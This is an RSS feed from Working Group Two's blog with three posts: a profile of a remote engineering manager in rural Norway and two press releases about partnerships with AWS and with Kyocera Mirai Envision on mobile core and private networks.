<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/">
    <channel>
        <title>[Demo] Victor alf - Devpages (#272) Blog</title>
        <link>https://www.wgtwo.com/jp/blog</link>
        <description>[Demo] Victor alf - Devpages (#272) Blog</description>
        <lastBuildDate>Thu, 02 Mar 2023 00:00:00 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>jp</language>
        <item>
            <title><![CDATA[Managing from the middle of nowhere]]></title>
            <link>https://www.wgtwo.com/jp/blog/managing-from-the-middle-of-nowhere</link>
            <guid>managing-from-the-middle-of-nowhere</guid>
            <pubDate>Thu, 02 Mar 2023 00:00:00 GMT</pubDate>
            <description><![CDATA[Picture a secluded spot deep in a Norwegian fjord. As you wander past the main farmhouse, you come across a barn. Inside, there are no animals in sight. Instead of hay and manure, you're greeted by the aroma of freshly made hot chocolate. And there, sitting behind a computer, surrounded by screens and a lightning-fast internet connection, is Karl Johan Heimark.]]></description>
            <content:encoded><![CDATA[<p><img loading="lazy" src="/jp/assets/images/kjh-officeview-559ef5fe21c9e5968ce430928fadb838.png" width="1334" height="788" class="img_ev3q"></p><p>Picture a secluded spot deep in a Norwegian fjord. As you wander past the main farmhouse, you come across a barn. Inside, there are no animals in sight. Instead of hay and manure, you're greeted by the aroma of freshly made hot chocolate. And there, sitting behind a computer, surrounded by screens and a lightning-fast internet connection, is Karl Johan Heimark.</p><p>Karl Johan is the Engineering Manager for a team of 17 talented software engineers scattered across Europe and Asia. Based in the little-known village of Vanvik, his unique workplace is a world away from the bustling tech hubs of Silicon Valley, London or even Oslo.</p><p>How does he manage a team of engineers from the middle of nowhere? </p><p><strong>In his own words:</strong></p><p>“Management and leadership are crucial in a distributed company, and it's easy to overlook their importance when things are running smoothly.”</p><p>“Lessons from Covid have shown that we were well-prepared as a distributed company from day one. We could continue to work much the same way as we already did. Covid didn't have a significant impact, but we did learn that doing social things, also in an online setting, is important to get people to know each other.”</p><figure class="figure_JG9S" style="width:50%;float:right;margin-left:20px"><img src="/jp/724046aee84f43146d6dd8427420500a.gif" alt="To Vanvik from space" class="image_HilK"><figcaption class="caption_lOvI">To Vanvik from space</figcaption></figure><p>“The pandemic has accelerated the shift towards remote work, and I believe that distributed companies will continue to thrive in the future.”</p><p>“Managing teams from the middle of nowhere has been a learning experience. I've found that trying to be close day-to-day by listening and following what's going on in Slack and standups is crucial.”</p><p>“Having regular one-on-ones with my team members every two weeks helps me stay on top of things. I spend half of Thursday and half of Tuesday on this. We use a single slide to guide us on gauging motivation levels, reviewing development goals and discussing things that are going well, and things that aren't going well. We put the slide on the screen, so both of us can see it and comment.”</p><figure class="figure_JG9S" style="width:50%;float:right;margin-left:20px"><img src="/jp/b5f2711bb3863f31fccc53be59679aef.png" alt="The four seasons of Vanvik" class="image_HilK"><figcaption class="caption_lOvI">The four seasons of Vanvik</figcaption></figure><p>“The fact that every team, including the management, is distributed means that everyone is included. Nobody is left outside.”</p><p>“As a natural introvert, I've become more comfortable with being an extrovert. I find both talking one on one and to a bigger group a lot easier over video than in person. When we have company settings and I meet everyone, it's not a big deal anymore.”</p><p>“I can’t follow the water cooler chat in the offices, so I'm not necessarily colored by who talks the most in those settings. This makes me feel like I start meetings and one-on-ones with a cleaner sheet than I would in an office setting.”</p><p>“I do miss the dopamine I used to get from coding when I could solve problems quickly. Management means that you think and work with a longer-term perspective. My job is to facilitate and try to make people productive, engaged and happy. I’ve found that having a few old farm buildings to maintain makes for some great distracting physical work where I see the result quickly.”</p><figure class="figure_JG9S" style="width:50%;float:right;margin-left:20px"><img src="/jp/2e57d5fea79760547c41e48e882c147c.png" alt="Cats living the good cat life" class="image_HilK"><figcaption class="caption_lOvI">Cats living the good cat life</figcaption></figure><p>“Living with only farmers as neighbors I’ve gotten an immense amount of respect for the Norwegian farmer. I get very inspired by the work ethic, year-round planning and all-round skills that goes into keeping a farm running in the Norwegian fjords.”</p><p>“My location impacts me in a few ways. Being close to nature and being able to go for a hike summer or winter is a great way for me to recharge and clear my head. On the other hand, traveling anywhere is at least a half-day effort. It's a balance, and I've learned to appreciate the pros and cons of my location.”</p><figure class="figure_JG9S" style="width:50%;float:middle;margin-left:20px"><img src="/jp/e2a99871cbdcd29fe270ee3185c00f85.gif" alt="Cows are friendly, too!" class="image_HilK"><figcaption class="caption_lOvI">Cows are friendly, too!</figcaption></figure>]]></content:encoded>
            <category>wfh</category>
            <category>management</category>
            <category>people</category>
            <category>vanvik</category>
        </item>
        <item>
            <title><![CDATA[Working Group Two announces strategic collaboration with Amazon Web Services]]></title>
            <link>https://www.wgtwo.com/jp/blog/wg2-teams-up-with-aws-strategic-partnership</link>
            <guid>wg2-teams-up-with-aws-strategic-partnership</guid>
            <pubDate>Wed, 15 Feb 2023 00:00:00 GMT</pubDate>
            <description><![CDATA[* Working Group Two and AWS collaborate to help telecom customers deploy mobile core in the cloud]]></description>
            <content:encoded><![CDATA[<ul><li>Working Group Two and AWS collaborate to help telecom customers deploy mobile core in the cloud </li><li>Working Group Two’s core-as-a-service empowers mobile operators globally to grow their revenues, drive cost savings and achieve platform effects</li></ul><p><strong>Oslo, Norway – February 15 2023</strong> – Working Group Two (WG2) and Amazon Web Services EMEA Sarl (AWS) are strengthening their collaboration by WG2 increasing AWS’s cloud services to supply mobile core solutions as a service to telecoms and enterprise customers. This expands on the value AWS and WG2 deliver to help telecom operators accelerate their adoption and modernization in the cloud as well as enhance their ability to innovate. </p><p>WG2 offers a modern core network delivered as a hosted service, which can help cost savings for mobile network operators. In substitution of complex and sub-scale core networks, WG2 allows operators to attach their radio networks to a global, common mobile core platform powered by services designed by AWS to be resilient and reliable. Operators are now able to procure, deploy and consume a 4G/5G/IMS core as-a-service, and focus purely on meeting customer demands. </p><p>WG2's cloud-native core lowers the barriers of entry for network deployments by allowing operators to scale with use. Additionally, WG2’s family of products utilizes the programmability of the core network to offer operators a marketplace of products and services they can bring to market without the need of building or integrating every product for each network.</p><p>Leading operators such as <a href="https://www.wgtwo.com/blog/ckh-iod-wg2-public-cloud/" target="_blank" rel="noopener noreferrer">CK Hutchison's CKH IOD</a> (Europe), Telenor's Vimla (Sweden), <a href="https://www.wgtwo.com/blog/mobi-expansion-with-wg2-aws/" target="_blank" rel="noopener noreferrer">Mobi</a> (United States) and Telavox (Norway, Sweden) already rely on WG2 to host and manage their core networks for parts of their business. WG2 is also delivering private networks in collaboration with <a href="https://www.wgtwo.com/blog/mitsui-knowledge-industry-mki-private-networks-business/" target="_blank" rel="noopener noreferrer">Mitsui Knowledge Industry</a> and <a href="https://www.wgtwo.com/blog/kcme-teams-up-with-wg2-for-private-networks/" target="_blank" rel="noopener noreferrer">Kyocera Mirai Envision</a> in Japan. </p><p>WG2 has spent the last seven years developing one of the world’s first cloud-native programmable multi-tenant mobile core platforms. This provides all the key telecom core features needed for a full-service core, serving everything from smartphones in public networks to Internet of Things (IoT) devices in private networks. AWS and WG2 will collaborate on evolving WG2’s control plane and user plane by leveraging AWS technologies. WG2 and AWS expect this collaboration to be beneficial for telco and enterprise customers that have an interest in modernizing their legacy platforms to cloud-native services and deploying mobile core solutions. </p><p>AWS’s Telco Director for EMEA, Fabio Cerone, commenting on WG2’s collaboration, said:</p><blockquote><p>“Already telcos leveraging Working Group Two’s cloud-native mobile core are gaining benefits of greater agility and faster time-to-market.  With the added support for IoT, Mobile Virtual Network Operators and Mobile Private Network use cases within the same platform, together AWS and WG2 will help telcos deliver even more value and services to their customers.”</p></blockquote><p>WG2 CEO, Erlend Prestgard, said: </p><blockquote><p>“The growth we have been part of is now strengthened by our strategic collaboration with AWS, in order to scale and deliver more customer value than before. More companies are starting to see the real benefits of cloud, which has been long heralded as a catalyst for innovation and digital transformation, thanks to its ability to increase development speed and provide near-limitless scale. We are bringing the deep expertise of WG2 and AWS’s powerful cloud services closer to our customers.”</p></blockquote><p>Mobi CEO, Justen Burdette, said:</p><blockquote><p>"We have set out to challenge the status quo in the wireless industry, and the strong relationship with WG2 has been instrumental in our ability to grow from ‘just’ a small regional wireless provider into a carrier that’s able to do truly disruptive things — things that typically would take years and exponentially more capital investment.  Thanks to the capabilities we are able to tap into together, we are able to build a seamless, digital, app-first customer experience by leveraging the scalable, secure, and future-proof WG2 mobile core network, powered by AWS. By working with WG2, we are able to better serve our customers and create a brand that resonates with a rapidly growing, collaborative ecosystem of partners." </p></blockquote><p><strong>About Working Group Two</strong><br>
<!-- -->Working Group Two has rebuilt the mobile core for simplicity, innovation, and efficiency – leveraging the web-scale playbook and operating models. Today, Working Group Two innovation enables MVNO, MNO, and Private Network Operators a secure, scalable, and reliable telco connectivity backbone that scales across all generations of mobile technologies. Our mission is to create programmable mobile networks to allow our customers and their end users to create more valuable and useful products and services. </p><p><strong>Media Contact:</strong><br>
<!-- -->Tor Odland<br>
<!-- -->Working Group Two<br>
<!-- -->+47 9909 0872<br>
<!-- -->tor(at)wgtwo.com</p>]]></content:encoded>
            <category>saas</category>
            <category>operators</category>
            <category>core</category>
            <category>cloud</category>
            <category>partners</category>
            <category>aws</category>
            <category>press release</category>
        </item>
        <item>
            <title><![CDATA[We're teaming up with Kyocera Mirai Envision to build private networks in Japan]]></title>
            <link>https://www.wgtwo.com/jp/blog/kcme-teams-up-with-wg2-for-private-networks</link>
            <guid>kcme-teams-up-with-wg2-for-private-networks</guid>
            <pubDate>Tue, 07 Feb 2023 00:00:00 GMT</pubDate>
            <description><![CDATA[* Kyocera Mirai Envision Co., Ltd. (KCME) and Working Group Two (WG2) have signed an agreement to jointly develop and offer an end-to-end solution for private networks in Japan.]]></description>
            <content:encoded><![CDATA[<p><img loading="lazy" src="data:image/png;base64,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" width="300" height="75" class="img_ev3q"></p><ul><li>Kyocera Mirai Envision Co., Ltd. (KCME) and Working Group Two (WG2) have signed an agreement to jointly develop and offer an end-to-end solution for private networks in Japan. </li><li>The two companies aim to serve customers across the business and public sectors with a highly differentiated offering that tackles current industry challenges, such as high initial cost, difficulty of deploying cloud-based solutions, and slow adoption. </li><li>Announcing first on-the-ground project with Sakaue Co. Ltd.</li></ul><p><strong>Kyocera Mirai Envision and Working Group Two unveil a differentiated private network offering in Japan.</strong></p><p><a href="https://www.kcme.jp/" target="_blank" rel="noopener noreferrer">KCME</a>, based in Japan, delivers solutions that integrate mobile and information communication technologies (ICT) in business areas, such as mobile internet, AI, IoT, big data, and virtual cloud. As part of the signed reseller agreement, KCME will leverage WG2’s mobile-core-as-a-service to deliver private networks that rely on sXGP (a local standard for unlicensed LTE spectrum), pLTE (so-called Broadband Wireless Access, or BWA), and local 5G capabilities. WG2 offers a rebuilt, modern core network delivered as a hosted service. It drives the dual benefits of cost savings and revenue growth for KCME and their private network customers. Instead of using complex and subscale core networks, WG2 allows operators to attach their radio networks to a global, common mobile core platform powered by infrastructure from AWS. </p><p>WG2’s API-based product ecosystem relies on the programmability of the core network to offer KCME and their customers a marketplace of products and services they can bring to market without the need of building or integrating every product for each network.</p><p>Potential customers include businesses using sXGP and/or local 5G. For sXGP, the offering from KCME and WG2 will mainly replace PHS systems (Personal Handyphone Systems) that are currently phasing out. Unlike PHS, which is a voice-only system, the LTE-based sXGP provides mobile broadband and IoT capabilities as part of the use cases. With local 5G, end customers would be able to start a radio DX with 5G capabilities. </p><p>KCME and WG2’s joint solution is also relevant for secondary integrators as part of their solution portfolio. <a href="https://www.synapse.jp" target="_blank" rel="noopener noreferrer">Synapse Co. Ltd.</a>, a local service provider based in Kagoshima City, has deployed the KCME-WG2 cloud solution on sXGP to an agricultural firm, <a href="https://sakaue-farm.co.jp" target="_blank" rel="noopener noreferrer">Sakaue Co. Ltd.</a>, based in Shibushi City, Kagoshima. This solution not only facilitates smartphone-based voice calls among employees, but also supports agricultural IoT sensing for temperature and soil conditions. </p><figure class="figure_JG9S" style="width:50%;float:right;margin-left:20px"><img src="/jp/5db5ba6e979a32740e881986e36fae14.png" alt="Agricultural illustration, courtesy Sakaue Co. Ltd." class="image_HilK"><figcaption class="caption_lOvI">Agricultural illustration, courtesy Sakaue Co. Ltd.</figcaption></figure><p>With KCME-WG2’s sXGP services, the customer has established a stable communication network across hundreds of different locations, even in areas that are not well-covered by national mobile network operators. This has enabled the implementation of Agricultural DX (digital technology to improve the efficiency and productivity of agricultural operations) within the same sXGP network.</p><p>Said Erlend Prestgard, CEO, Working Group Two:</p><blockquote><p>“We are excited to team up with KCME to jointly develop the market for private networks in Japan. By lowering the cost, reducing complexity, and speeding up the time to market, we can truly contribute to a differentiated solution in Japan. Utilizing a variety of spectrum options across multiple generations of telecommunications and multi-tenancy on AWS, we can support a wide range of customer needs," </p></blockquote><p>Said Hyungbae Kim, President and CEO of Kyocera Mirai Envision Co., Ltd.:</p><blockquote><p>"By collaborating with WG2, we are harnessing the power of cloud technology to revolutionize sXGP. Our efforts to streamline deployment and lower costs will accelerate the expansion of the private network market in Japan. Furthermore, by utilizing the programmable core network, we can differentiate and innovate, developing and delivering unique solutions that provide real value for our customers," stated </p></blockquote><p><strong>About Kyocera Mirai Envision</strong><br>
<!-- -->Kyocera Mirai Envision, a subsidiary of the Kyocera Group, began operations in 2011 with the goal of becoming a global company that helps create communities where people can live without disparity. We achieve this by offering optimized solutions that integrate mobile and ICT technology at their core. Our business includes not only the fields of mobile internet, AI, IoT, big data, and virtual cloud, which are the foundations of the information revolution, but also 5G, SDN, NFV, GPON, and related engineering. As a member of the Local SDGs Public-Private Partnership Platform, we are committed to working towards the achievement of the SDG “Creating a Town to Live In.”</p><p>Company name: Kyocera Mirai Envision Ltd.<br>
<!-- -->Location: Mita 43 MT Building, 3-13-16 Mita, Minato-ku, Tokyo 108-0073, Japan<br>
<!-- -->Representative: President &amp; CEO Hyungbae Kim<br>
<!-- -->Established: 1 April 2011<br>
<!-- -->URL: <a href="https://www.kcme.jp/" target="_blank" rel="noopener noreferrer">https://www.kcme.jp/</a>  </p><p><strong>About Working Group Two</strong><br>
<!-- -->Working Group Two has rebuilt the mobile core for simplicity, innovation, and efficiency – leveraging the web-scale playbook and operating models. Today, Working Group Two innovation enables MVNO, MNO, and Private Network Operators a secure, scalable, and reliable telco connectivity backbone that scales across all generations of mobile technologies. Our mission is to create programmable mobile networks to allow our customers and their end users to create more valuable and useful products and services. </p><p><strong>Media Contact:</strong><br>
<!-- -->Tor Odland<br>
<!-- -->Working Group Two<br>
<!-- -->+47 9909 0872<br>
<!-- -->tor(at)wgtwo.com</p>]]></content:encoded>
            <category>saas</category>
            <category>operators</category>
            <category>core</category>
            <category>cloud</category>
            <category>partners</category>
